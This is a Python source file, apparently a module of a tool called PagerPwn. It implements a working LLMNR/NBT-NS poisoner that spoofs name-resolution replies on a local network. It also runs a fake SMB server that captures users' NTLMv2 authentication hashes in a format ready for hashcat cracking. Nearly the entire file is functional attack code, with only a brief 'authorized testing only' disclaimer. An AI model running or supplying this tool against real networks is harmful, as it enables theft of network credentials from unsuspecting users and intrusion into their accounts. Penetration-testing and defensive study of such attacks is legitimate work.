"""
llmnr.py - LLMNR/NBT-NS Poisoner + NTLMv2 Hash Capture for PagerPwn

Listens for LLMNR (UDP 5355) and NBT-NS (UDP 137) name resolution broadcasts.
Responds with our IP to redirect auth attempts, then captures NTLMv2
challenge/response hashes on a mini SMB listener (TCP 445).

Output format: hashcat -m 5600 compatible.
Module interface: run(config, ui_callback, stop_event) -> dict

Home lab PoC — authorized testing only.
"""

import os
import socket
import struct
import threading
import time

# ── Constants ─────────────────────────────────────────────────────────────────
LLMNR_ADDR = "224.0.0.252"
LLMNR_PORT = 5355
NBTNS_PORT = 137
SMB_PORT   = 445

# NTLM constants
NTLMSSP_SIGNATURE = b"NTLMSSP\x00"
NTLM_NEGOTIATE    = 1
NTLM_CHALLENGE    = 2
NTLM_AUTH         = 3

# Fixed server challenge for reproducibility (8 bytes)
SERVER_CHALLENGE = os.urandom(8)


# ── LLMNR Poisoner ────────────────────────────────────────────────────────────

def _llmnr_listener(our_ip, ui_callback, stop_event, stats):
    """Listen for LLMNR queries and respond with our IP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(("", LLMNR_PORT))
        mreq = socket.inet_aton(LLMNR_ADDR) + socket.inet_aton("0.0.0.0")
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        sock.settimeout(1.0)
    except Exception as e:
        ui_callback("[LLMNR] BIND FAIL", str(e)[:30])
        return

    our_ip_bytes = socket.inet_aton(our_ip)

    while not stop_event.is_set():
        try:
            data, (src_ip, src_port) = sock.recvfrom(1024)
        except socket.timeout:
            continue
        except Exception:
            break

        if len(data) < 12:
            continue

        # Parse LLMNR header
        txid = data[:2]
        flags = struct.unpack(">H", data[2:4])[0]
        qdcount = struct.unpack(">H", data[4:6])[0]

        # Only respond to queries (QR=0)
        if flags & 0x8000:
            continue
        if qdcount < 1:
            continue

        # Extract queried name
        offset = 12
        name_parts = []
        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            offset += 1
            name_parts.append(data[offset:offset + length])
            offset += length

        if not name_parts:
            continue

        queried_name = b".".join(name_parts)

        # Skip our own queries
        if src_ip == our_ip:
            continue

        stats["queries"] += 1

        # Build response: same TxID, QR=1, authoritative
        # Header: TxID + flags(0x8000) + QD=1 + AN=1 + NS=0 + AR=0
        resp = txid + struct.pack(">HHHHH", 0x8000, 1, 1, 0, 0)

        # Question section (echo back)
        for part in name_parts:
            resp += bytes([len(part)]) + part
        resp += b"\x00"
        resp += struct.pack(">HH", 1, 1)  # TYPE A, CLASS IN

        # Answer section
        for part in name_parts:
            resp += bytes([len(part)]) + part
        resp += b"\x00"
        resp += struct.pack(">HH", 1, 1)       # TYPE A, CLASS IN
        resp += struct.pack(">I", 30)           # TTL 30s
        resp += struct.pack(">H", 4)            # RDLENGTH
        resp += our_ip_bytes                     # Our IP

        try:
            sock.sendto(resp, (src_ip, src_port))
            stats["poisoned"] += 1
            ui_callback(f"[LLMNR] POISONED", f"{src_ip} -> {queried_name.decode(errors='replace')}")
        except Exception:
            pass

    sock.close()


# ── NBT-NS Poisoner ──────────────────────────────────────────────────────────

def _nbtns_listener(our_ip, ui_callback, stop_event, stats):
    """Listen for NBT-NS queries and respond with our IP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.bind(("", NBTNS_PORT))
        sock.settimeout(1.0)
    except Exception:
        return  # NBT-NS is secondary, don't error out

    our_ip_bytes = socket.inet_aton(our_ip)

    while not stop_event.is_set():
        try:
            data, (src_ip, src_port) = sock.recvfrom(1024)
        except socket.timeout:
            continue
        except Exception:
            break

        if len(data) < 50 or src_ip == our_ip:
            continue

        # Parse NBT-NS header
        txid = data[:2]
        flags = struct.unpack(">H", data[2:4])[0]
        if flags & 0x8000:  # skip responses
            continue

        # Decode NetBIOS name from byte 13 onwards
        try:
            encoded = data[13:45]
            name = ""
            for i in range(0, 30, 2):
                name += chr(((encoded[i] - 0x41) << 4) | (encoded[i + 1] - 0x41))
            name = name.strip()
        except Exception:
            continue

        stats["queries"] += 1

        # Build NBT-NS response
        resp = txid
        resp += struct.pack(">H", 0x8500)  # flags: response + authoritative
        resp += struct.pack(">HH", 0, 1)   # QD=0, AN=1
        resp += struct.pack(">HH", 0, 0)   # NS=0, AR=0
        resp += data[12:46]                 # echo the name
        resp += struct.pack(">HH", 0x0020, 0x0001)  # NB, IN
        resp += struct.pack(">IH", 30, 6)  # TTL=30, RDLENGTH=6
        resp += struct.pack(">H", 0)       # flags
        resp += our_ip_bytes

        try:
            sock.sendto(resp, (src_ip, src_port))
            stats["poisoned"] += 1
        except Exception:
            pass

    sock.close()


# ── Mini SMB Server (NTLMv2 Hash Capture) ─────────────────────────────────────

def _build_ntlm_challenge():
    """Build NTLMSSP_CHALLENGE message with our server challenge."""
    # Minimal NTLM challenge
    target_name = "PAGERPWN".encode("utf-16-le")
    target_info = b""

    # MsvAvNbDomainName (type 2)
    domain = "PAGERPWN".encode("utf-16-le")
    target_info += struct.pack("<HH", 2, len(domain)) + domain
    # MsvAvNbComputerName (type 1)
    computer = "PAGER".encode("utf-16-le")
    target_info += struct.pack("<HH", 1, len(computer)) + computer
    # MsvAvEOL (type 0)
    target_info += struct.pack("<HH", 0, 0)

    # Target name fields offset
    target_name_offset = 56
    target_info_offset = target_name_offset + len(target_name)

    challenge = NTLMSSP_SIGNATURE
    challenge += struct.pack("<I", NTLM_CHALLENGE)     # MessageType
    challenge += struct.pack("<HHI", len(target_name), len(target_name), target_name_offset)  # TargetNameFields
    challenge += struct.pack("<I", 0x00028233)          # NegotiateFlags
    challenge += SERVER_CHALLENGE                        # ServerChallenge
    challenge += b"\x00" * 8                             # Reserved
    challenge += struct.pack("<HHI", len(target_info), len(target_info), target_info_offset)
    challenge += b"\x00" * 8   # Version field (8 bytes, zeros) — required for offset 56 to be correct
    challenge += target_name
    challenge += target_info

    return challenge


def _build_smb_negotiate_response():
    """Build SMB1 negotiate response pointing to NTLMSSP."""
    ntlm_challenge = _build_ntlm_challenge()

    # SMB header (32 bytes)
    smb = b"\xffSMB"                      # protocol
    smb += b"\x72"                          # command: negotiate
    smb += struct.pack("<I", 0)             # status: success
    smb += b"\x98"                          # flags
    smb += struct.pack("<H", 0xC853)        # flags2
    smb += b"\x00" * 12                     # pad
    smb += struct.pack("<H", 0)             # TID
    smb += struct.pack("<H", os.getpid() & 0xFFFF)  # PID
    smb += struct.pack("<H", 0)             # UID
    smb += struct.pack("<H", 0)             # MID

    # Negotiate response parameters
    params = struct.pack("<H", 0)           # DialectIndex
    params += b"\x03"                       # SecurityMode
    params += struct.pack("<H", 1)          # MaxMpxCount
    params += struct.pack("<H", 1)          # MaxVCs
    params += struct.pack("<I", 16644)      # MaxBufferSize
    params += struct.pack("<I", 65536)      # MaxRawBuffer
    params += struct.pack("<I", 0)          # SessionKey
    params += struct.pack("<I", 0x00008215) # Capabilities
    params += struct.pack("<Q", 0)          # SystemTime
    params += struct.pack("<H", 0)          # ServerTimeZone
    params += b"\x00"                       # ChallengeLength (0 for extended security)

    # Byte count includes security blob
    word_count = len(params) // 2
    byte_data = struct.pack("<H", len(ntlm_challenge) + 16)
    byte_data += b"\x60" + bytes([len(ntlm_challenge) + 14])
    byte_data += b"\x06\x06\x2b\x06\x01\x05\x05\x02"  # SPNEGO OID
    byte_data += b"\xa0" + bytes([len(ntlm_challenge) + 4])
    byte_data += b"\x30" + bytes([len(ntlm_challenge) + 2])
    byte_data += b"\xa2" + bytes([len(ntlm_challenge)])
    byte_data += ntlm_challenge

    resp = smb
    resp += bytes([word_count])
    resp += params
    resp += struct.pack("<H", len(byte_data))
    resp += byte_data

    # NetBIOS session header
    nb_header = struct.pack(">I", len(resp))
    return nb_header + resp


def _extract_ntlmv2(data, stats, hashes, ui_callback):
    """Extract NTLMv2 hash from NTLM_AUTH message in SMB data."""
    try:
        # Find NTLMSSP signature
        idx = data.find(NTLMSSP_SIGNATURE)
        if idx < 0:
            return
        ntlm = data[idx:]

        msg_type = struct.unpack("<I", ntlm[8:12])[0]
        if msg_type != NTLM_AUTH:
            return

        # Parse NTLM_AUTH fields
        lm_len = struct.unpack("<H", ntlm[12:14])[0]
        lm_off = struct.unpack("<I", ntlm[16:20])[0]
        nt_len = struct.unpack("<H", ntlm[20:22])[0]
        nt_off = struct.unpack("<I", ntlm[24:28])[0]
        domain_len = struct.unpack("<H", ntlm[28:30])[0]
        domain_off = struct.unpack("<I", ntlm[32:36])[0]
        user_len = struct.unpack("<H", ntlm[36:38])[0]
        user_off = struct.unpack("<I", ntlm[40:44])[0]

        domain = ntlm[domain_off:domain_off + domain_len].decode("utf-16-le", errors="replace")
        user = ntlm[user_off:user_off + user_len].decode("utf-16-le", errors="replace")

        # NTLMv2 response: first 16 bytes are NTProofStr, rest is blob
        nt_data = ntlm[nt_off:nt_off + nt_len]
        if len(nt_data) < 24:
            return

        nt_proof = nt_data[:16].hex()
        nt_blob = nt_data[16:].hex()

        challenge_hex = SERVER_CHALLENGE.hex()

        # hashcat -m 5600 format:
        # user::domain:server_challenge:nt_proof:nt_blob
        hash_line = f"{user}::{domain}:{challenge_hex}:{nt_proof}:{nt_blob}"

        entry = {
            "user": user,
            "domain": domain,
            "hash_line": hash_line,
        }
        hashes.append(entry)
        stats["captures"] += 1

        ui_callback(f"[LLMNR] HIT!", f"{domain}\\{user}")

    except Exception:
        pass


def _smb_server(our_ip, ui_callback, stop_event, stats, hashes):
    """Minimal SMB server to capture NTLMv2 auth attempts."""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(("0.0.0.0", SMB_PORT))
        server.listen(5)
        server.settimeout(1.0)
    except Exception as e:
        ui_callback("[SMB] BIND FAIL", str(e)[:30])
        return

    negotiate_resp = _build_smb_negotiate_response()

    while not stop_event.is_set():
        try:
            conn, addr = server.accept()
            conn.settimeout(5.0)
        except socket.timeout:
            continue
        except Exception:
            break

        try:
            # Receive SMB negotiate
            data = conn.recv(4096)
            if not data:
                conn.close()
                continue

            # Send our challenge
            conn.send(negotiate_resp)

            # Receive auth with NTLMv2
            auth_data = conn.recv(8192)
            if auth_data:
                _extract_ntlmv2(auth_data, stats, hashes, ui_callback)

        except Exception:
            pass
        finally:
            try:
                conn.close()
            except Exception:
                pass

    server.close()


# ── Main Entry Point ──────────────────────────────────────────────────────────

def run(config, ui_callback, stop_event):
    """
    Run LLMNR/NBT-NS poisoner + SMB hash capture.

    Returns:
        dict: {"hashes": [{"user": str, "domain": str, "hash_line": str}],
               "stats": {"queries": int, "poisoned": int, "captures": int}}
    """
    iface = config.get("IFACE", "br-lan")

    # Get our IP on the LAN — connect to subnet gateway (.1) or any routable addr
    subnet = config.get("SUBNET", "192.168.0")
    gateway = config.get("GATEWAY", f"{subnet}.1")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect((gateway, 80))
        our_ip = s.getsockname()[0]
        s.close()
    except Exception:
        our_ip = "0.0.0.0"

    ui_callback("[LLMNR] STARTING", f"Binding on {our_ip}")

    stats = {"queries": 0, "poisoned": 0, "captures": 0}
    hashes = []

    # Start all threads
    threads = [
        threading.Thread(target=_llmnr_listener, args=(our_ip, ui_callback, stop_event, stats), daemon=True),
        threading.Thread(target=_nbtns_listener, args=(our_ip, ui_callback, stop_event, stats), daemon=True),
        threading.Thread(target=_smb_server, args=(our_ip, ui_callback, stop_event, stats, hashes), daemon=True),
    ]
    for t in threads:
        t.start()

    # Update display while running
    while not stop_event.is_set():
        ui_callback(
            f"[LLMNR] Captures: {stats['captures']}",
            f"Queries: {stats['queries']} | Poisoned: {stats['poisoned']}"
        )
        time.sleep(1)

    # Wait for threads to finish
    for t in threads:
        t.join(timeout=2)

    ui_callback(f"[LLMNR] DONE", f"{stats['captures']} hash(es) captured")
    time.sleep(1)

    return {"hashes": hashes, "stats": stats}
